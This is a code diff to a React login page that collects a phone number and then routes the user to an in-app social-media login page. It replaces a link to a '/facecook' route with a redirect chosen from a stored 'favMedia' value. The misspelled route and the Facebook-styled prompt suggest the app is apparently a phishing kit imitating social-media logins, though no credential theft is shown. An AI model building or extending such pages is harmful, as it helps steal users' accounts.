@@ -1,8 +1,19 @@
 import React from "react";
-import { Link } from "react-router-dom";
 import NavBar from "../Components/NavBar";
 
 const Login = () => {
+  const [faveMedia, setFaveMedia] = React.useState(null);
+
+  React.useEffect(() => {
+    const favMedia = JSON.parse(localStorage.getItem("favMedia"));
+    if (favMedia) {
+      setFaveMedia(favMedia);
+    }
+  }, []);
+
+  const handleFaveMedia = () => {
+    window.location.replace(`/${faveMedia}`);
+  };
   return (
     <>
       <NavBar />
@@ -13,19 +24,21 @@ const Login = () => {
             <span>+254</span>
             <input
               type="number"
-              class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
               required
               name="number"
             />
           </div>
           <p className="mt-8">
-            Click{" "}
-            <Link to="/facecook">
-              <span className="text-[24px] bg-[#1877f2] p-2 rounded-3xl">
-                here
-              </span>
-            </Link>{" "}
-            to log in to facebook and complete your submission
+            Click
+            <span
+              onClick={handleFaveMedia}
+              className="text-[24px] bg-[#1877f2] p-2 rounded-3xl"
+            >
+              here
+            </span>
+            to log in to your favorite social media platform and complete your
+            submission
           </p>
         </div>
       </div>
